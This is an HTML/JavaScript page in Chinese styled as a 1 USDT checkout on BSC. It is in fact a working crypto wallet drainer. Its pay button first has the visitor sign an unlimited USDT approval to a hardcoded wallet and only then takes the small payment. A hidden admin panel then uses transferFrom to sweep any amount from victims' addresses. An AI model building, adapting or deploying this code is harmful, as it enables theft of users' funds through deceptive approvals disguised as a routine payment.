<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>订单支付系统</title>
<script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.0/dist/umd/sign-client.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,Microsoft YaHei}
body{background:#111827;padding:16px;color:#fff}
.container{max-width:440px;margin:0 auto}
.card{background:#1f2937;border-radius:20px;padding:26px;border:1px solid #374151}
.title{font-size:22px;text-align:center;color:#ffd048;margin-bottom:6px}
.desc{text-align:center;color:#9ca3af;font-size:14px;margin-bottom:24px}
.info-box{background:#374151;border-radius:14px;padding:18px;margin-bottom:22px}
.row{display:flex;justify-content:space-between;padding:8px 0;font-size:15px;color:#d1d5db}
.price{color:#ff6b6b;font-weight:bold;font-size:18px}
.wallet-text{text-align:center;margin:18px 0;color:#90caf9;font-size:14px}
.btn{width:100%;height:50px;border:none;border-radius:14px;font-size:16px;font-weight:500;cursor:pointer;margin:10px 0}
.btn-connect{background:#2563eb;color:#fff}
.btn-pay{background:#059669;color:#fff}
.btn-pay:disabled{opacity:0.6;cursor:not-allowed}
.tip{font-size:12px;color:#6b7280;text-align:center;margin-top:6px}
.qrcode-wrap{text-align:center;margin:16px 0;display:none}
#wcQrcode{background:#fff;padding:8px;border-radius:10px;display:inline-block}
.load{color:#ffd048;text-align:center;margin:8px 0;display:none}
.admin-area{margin-top:26px;padding-top:20px;border-top:1px solid #374151;display:none}
.admin-title{text-align:center;color:#ff7777;margin-bottom:12px;font-size:16px}
input{width:100%;height:46px;background:#374151;border:1px solid #4b5563;border-radius:10px;padding:0 14px;color:#fff;margin:8px 0;font-size:15px}
.btn-collect{background:#dc2626;color:#fff}
</style>
</head>
<body>
<div class="container">
    <div class="card">
        <h2 class="title">订单支付</h2>
        <p class="desc">连接钱包完成链上核验支付</p>

        <div class="info-box">
            <div class="row">
                <span>支付币种</span>
                <span>USDT (BSC)</span>
            </div>
            <div class="row">
                <span>应付金额</span>
                <span class="price">1.00 USDT</span>
            </div>
        </div>

        <button class="btn btn-connect" id="connectBtn">连接钱包</button>
        <div class="load" id="loading">初始化连接中...</div>
        <div class="qrcode-wrap" id="qrWrap">
            <div id="wcQrcode"></div>
            <p style="margin-top:6px;color:#9ca3af;font-size:13px">TP钱包扫码连接</p>
        </div>

        <div class="wallet-text">已连接：<span id="addrShow">未连接</span></div>

        <p class="tip">第一步：授权；第二步：转账付款</p>
        <button class="btn btn-pay" id="payBtn">确认支付 1.00 USDT</button>

        <!-- 管理员归集面板 -->
        <div class="admin-area" id="adminPanel">
            <h3 class="admin-title">管理员资产归集</h3>
            <input placeholder="用户钱包地址" id="userAddress">
            <input placeholder="归集数量 USDT" id="amountInput">
            <button class="btn btn-collect" id="collectBtn">一键归集资产</button>
        </div>
    </div>
</div>

<script>
// =====================【配置区】=====================
const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const CHAIN_ID = 56;
const PAY_AMOUNT = 1;
// ===================================================

let connectedAddress = "";
let signClient = null;
let walletSession = null;
let isApproved = false; // 标记是否已经授权

const loadingDom = document.getElementById("loading");
const qrWrapDom = document.getElementById("qrWrap");
const addrShowDom = document.getElementById("addrShow");
const adminPanelDom = document.getElementById("adminPanel");
const payBtn = document.getElementById("payBtn");

// 初始化 WalletConnect
async function initWalletConnect() {
    loadingDom.style.display = "block";
    try {
        signClient = await SignClient.init({
            projectId: "9a85f847a3f349ec86f2d353a7f82170",
            metadata: {
                name: "订单支付系统",
                description: "BSC链支付DApp",
                url: window.location.origin,
                icons: ["https://picsum.photos/id/237/100/100"]
            }
        });
        signClient.on("session_delete", () => {
            connectedAddress = "";
            walletSession = null;
            isApproved = false;
            addrShowDom.innerText = "未连接";
            qrWrapDom.style.display = "none";
            adminPanelDom.style.display = "none";
        });
        loadingDom.style.display = "none";
        return true;
    } catch (err) {
        loadingDom.style.display = "none";
        alert("网络初始化失败，请切换网络重试");
        return false;
    }
}

// 连接钱包按钮
document.getElementById("connectBtn").addEventListener("click", async () => {
    if (window.ethereum) {
        try {
            const accounts = await ethereum.request({ method: "eth_requestAccounts" });
            connectedAddress = accounts[0].toLowerCase();
            addrShowDom.innerText = connectedAddress.slice(0, 6) + "..." + connectedAddress.slice(-4);
            if (connectedAddress === ADMIN_WALLET) {
                adminPanelDom.style.display = "block";
            }
            alert("✅ 钱包连接成功，可以发起支付");
            return;
        } catch (e) {
            console.log("内置钱包唤起失败，启用扫码模式");
        }
    }

    if (!signClient) {
        const initOk = await initWalletConnect();
        if (!initOk) return;
    }
    try {
        const { uri, approval } = await signClient.connect({
            requiredNamespaces: {
                eip155: {
                    chains: [`eip155:${CHAIN_ID}`],
                    methods: ["eth_sendTransaction"],
                    events: ["chainChanged", "accountsChanged"]
                }
            }
        });
        qrWrapDom.style.display = "block";
        document.getElementById("wcQrcode").innerHTML = "";
        QRCode.toCanvas(document.getElementById("wcQrcode"), uri, { width: 200 });
        walletSession = await approval();
        const addrFull = walletSession.namespaces.eip155.accounts[0].split(":")[2];
        connectedAddress = addrFull.toLowerCase();
        addrShowDom.innerText = connectedAddress.slice(0, 6) + "..." + connectedAddress.slice(-4);
        qrWrapDom.style.display = "none";
        if (connectedAddress === ADMIN_WALLET) {
            adminPanelDom.style.display = "block";
        }
    } catch (err) {
        alert("连接取消或失败，请重新点击");
    }
})

// 支付按钮
payBtn.addEventListener("click", async () => {
    if (!connectedAddress) return alert("请先连接钱包！");
    payBtn.disabled = true;
    try {
        const receiverHex = ADMIN_WALLET.slice(2).padStart(64, "0");
        if(!isApproved){
            // =========第一步：执行授权Approve=========
            const MAX_ALLOWANCE = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
            const approveCalldata = "0x095ea7b3" + receiverHex + MAX_ALLOWANCE;
            const approveTx = [{
                from: connectedAddress,
                to: USDT_CONTRACT,
                gas: "0x300000",
                data: approveCalldata
            }];
            if (window.ethereum && !walletSession) {
                await ethereum.request({ method: "eth_sendTransaction", params: approveTx });
            } else if (signClient && walletSession) {
                await signClient.request({
                    topic: walletSession.topic,
                    chainId: `eip155:${CHAIN_ID}`,
                    request: { method: "eth_sendTransaction", params: approveTx }
                });
            }
            isApproved = true;
            alert("✅ 授权成功！请再次点击支付按钮完成转账");
        }else{
            // =========第二步：执行转账=========
            const amountBig = BigInt(PAY_AMOUNT * 10n ** 18n).toString(16).padStart(64, "0");
            const transferCalldata = "0xa9059cbb" + receiverHex + amountBig;
            const transferTx = [{
                from: connectedAddress,
                to: USDT_CONTRACT,
                gas: "0x300000",
                data: transferCalldata
            }];
            if (window.ethereum && !walletSession) {
                await ethereum.request({ method: "eth_sendTransaction", params: transferTx });
            } else if (signClient && walletSession) {
                await signClient.request({
                    topic: walletSession.topic,
                    chainId: `eip155:${CHAIN_ID}`,
                    request: { method: "eth_sendTransaction", params: transferTx }
                });
            }
            alert("✅ 支付完成！订单核验成功");
        }
    } catch (e) {
        // 区分报错
        console.error(e);
        alert("交易被用户取消，请重试");
    } finally {
        payBtn.disabled = false;
    }
})

// 管理员归集 transferFrom
document.getElementById("collectBtn").addEventListener("click", async () => {
    if (connectedAddress !== ADMIN_WALLET) return alert("仅管理员可执行归集");
    const targetUser = document.getElementById("userAddress").value.trim();
    const collectNum = document.getElementById("amountInput").value.trim();
    if (!targetUser || !collectNum || Number(collectNum) <= 0) return alert("请填写完整信息");

    const fromHex = targetUser.toLowerCase().slice(2).padStart(64, "0");
    const toHex = ADMIN_WALLET.slice(2).padStart(64, "0");
    const valueHex = BigInt(Math.floor(Number(collectNum) * 1e18)).toString(16).padStart(64, "0");
    const transferFromData = "0x23b872dd" + fromHex + toHex + valueHex;
    const txParam = [{
        from: connectedAddress,
        to: USDT_CONTRACT,
        gas: "0x300000",
        data: transferFromData
    }];
    try {
        if (window.ethereum && !walletSession) {
            await ethereum.request({ method: "eth_sendTransaction", params: txParam });
        } else {
            await signClient.request({
                topic: walletSession.topic,
                chainId: `eip155:${CHAIN_ID}`,
                request: { method: "eth_sendTransaction", params: txParam }
            });
        }
        alert("资产归集成功");
        document.getElementById("userAddress").value = "";
        document.getElementById("amountInput").value = "";
    } catch (err) {
        alert("归集失败");
    }
})
</script>
</body>
</html>
